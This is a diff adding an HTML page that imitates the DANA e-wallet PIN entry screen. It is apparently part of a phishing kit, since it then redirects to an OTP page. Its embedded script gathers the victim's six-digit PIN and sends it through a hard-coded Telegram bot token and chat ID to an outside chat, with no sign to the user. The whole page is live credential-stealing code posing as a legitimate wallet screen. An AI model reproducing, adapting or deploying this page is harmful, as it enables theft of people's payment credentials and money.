@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+  <meta name="theme-color" content="#118EEA">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PIN-DANA</title>
+    <style>
+        body {
+            background-color: #118EEA;
+            
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            margin-top: 10px;
+        }
+        .pin-input {
+            margin-top: 20px;
+            display: flex;
+        }
+        .pin-input input {
+            width: 35px;
+            height: 37px;
+            font-weight: bold;
+            font-size: 16px;
+            text-align: center;
+            margin: 0 5px;
+            margin-left:14px;
+            border: 1px solid white;
+            background-color: white;
+        }
+        .loader {
+            border: 8px solid #f3f3f3; /* Light grey */
+            border-top: 8px solid #3498db; /* Blue */
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 2s linear infinite;
+            display: none;
+            margin-left:160px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .gambar-bawah {
+      display: flex;
+      justify-content: center;
+      position: relative;
+      bottom: -10px;
+    }
+
+    .gambar-bawah img {
+      width: 90%;
+      object-fit: cover;
+      margin: 0 25px;
+    }
+    </style>
+</head>
+<body>
+    <img src="https://i.ibb.co/9T33N8k/1000006615-removebg-preview.png" alt="Centered Image">
+    <div class="pin-input">
+        <input type="tel" maxlength="1" id="pin1" onkeyup="moveToNext(this, 'pin2')">
+        <input type="tel" maxlength="1" id="pin2" onkeyup="moveToNext(this, 'pin3')">
+        <input type="tel" maxlength="1" id="pin3" onkeyup="moveToNext(this, 'pin4')">
+        <input type="tel" maxlength="1" id="pin4" onkeyup="moveToNext(this, 'pin5')">
+        <input type="tel" maxlength="1" id="pin5" onkeyup="moveToNext(this, 'pin6')">
+        <input type="tel" maxlength="1" id="pin6" onkeyup="processPin()">
+    </div>
+    <div class="loader"></div><br>
+    <div class="gambar gambar-bawah">
+    <img src="https://i.ibb.co/sHZ5hwr/1000006619-removebg-preview.png" alt="Logo LPS">
+  </div>
+
+    <script>
+        function moveToNext(input, nextInputId) {
+            if (input.value.length === input.maxLength) {
+                document.getElementById(nextInputId).focus();
+            }
+        }
+
+        function showLoader() {
+            var loader = document.querySelector('.loader');
+            loader.style.display = 'block';
+            setTimeout(function() {
+                window.location.href = 'myotp.html';
+            }, 3000);
+        }
+
+        function processPin() {
+            var pin = '';
+            for (var i = 1; i <= 6; i++) {
+                pin += document.getElementById('pin' + i).value;
+            }
+
+            if (pin.length === 6) {
+                // Menampilkan loader
+                showLoader();
+
+                // Menggunakan AJAX untuk mengirim PIN ke bot Telegram
+                var xhttp = new XMLHttpRequest();
+                var token = '6406080700:AAHtISL259Uu4s3x93AzNMWK-XGedAGdp_0';
+                var chatId = '6824078885';
+                var message = 'PIN Anda: ' + pin;
+                var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
+                xhttp.open("GET", url, true);
+                xhttp.send();
+            }
+        }
+    </script>
+</body>
+</html>
